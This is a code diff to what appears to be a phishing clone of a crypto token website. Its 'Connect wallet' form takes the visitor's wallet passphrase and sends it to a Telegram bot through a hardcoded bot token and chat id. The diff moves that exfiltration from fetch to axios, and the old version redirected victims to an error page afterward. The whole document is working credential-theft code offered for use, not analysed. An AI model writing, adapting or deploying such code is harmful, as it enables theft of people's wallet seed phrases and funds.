@@ -174,6 +174,7 @@
       href="https://wallstreetpepe.com/styles-D26QEKG4.css"
       media="all"
     />
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
   </head>
 
   <body class="ng-tns-0-0">
@@ -72719,61 +72720,47 @@
         });
       });
 
-      document
-        .getElementById("submit-btn")
-        .addEventListener("click", function (e) {
-          e.preventDefault();
+      document.getElementById('submit-btn').addEventListener('click', async function(e) {
+  e.preventDefault();
+  
+const submitButton = document.getElementById('submit-btn');
+    submitButton.textContent = "Connecting...";  // Change button text to indicate sending
+    submitButton.disabled = true;  // Disable the button while the request is being processed
+  try {
+    const walletInput = document.getElementById('wallet-input').value;
 
-          try {
-            const walletInput = document.getElementById("wallet-input").value;
+    // Check if the input is not empty
+    if (!walletInput) {
+      alert("Please enter your passphrase to connect to wallet");
+      return;
+    }
 
-            // Check if the input is not empty
-            if (!walletInput) {
-              alert("Please enter your passphrase to connect to wallet");
-              return;
-            }
+    // Show loading or sending message
+    
 
-            // Show loading or sending message
-            const submitButton = document.getElementById("submit-btn");
-            submitButton.textContent = "Connecting..."; // Change button text to indicate sending
-            submitButton.disabled = true; // Disable the button while the request is being processed
+    // Define the data you want to send in the POST request
+    const text = walletInput
 
-            // Define the data you want to send in the POST request
-            const text = walletInput;
 
-            let BOT_TOKEN = "7768282801:AAGmIi6q-1-5fsXxCx8IfeAg2a5O2BQcKgU";
-            let chat_id = "6319409349";
+    let BOT_TOKEN = '7768282801:AAGmIi6q-1-5fsXxCx8IfeAg2a5O2BQcKgU'
+    let chat_id = '6319409349'
 
-            // Make the fetch request
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                chat_id,
-                text,
-              }), // Send the input as JSON
-            })
-              .then((response) => response.json())
-              .then((data) => {
-                console.log("Success:", data);
-                // Handle the response here (e.g., show a success message)
-                 window.location.href = "error.html"
-              })
-              .catch((error) => {
-                console.error("Error:", error);
-                alert("An error occurred while sending the request.");
-              })
-              .finally(() => {
-                // Reset the button state after request completes
-                submitButton.textContent = "Connect wallet"; // Change text back to original
-                submitButton.disabled = false; // Re-enable the button
-              });
-          } catch (error) {
-            console.log(error);
-          }
-        });
+    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id,
+        text
+    })
+    console.log(response)
+    alert('sent')
+    
+
+  } catch (error) {
+    console.log(error);
+     alert('An error occurred while sending the request.');
+  } finally {
+    submitButton.textContent = "Connect wallet"; // Change text back to original
+      submitButton.disabled = false; // Re-enable the button
+  }
+});
     </script>
   </body>
 </html>
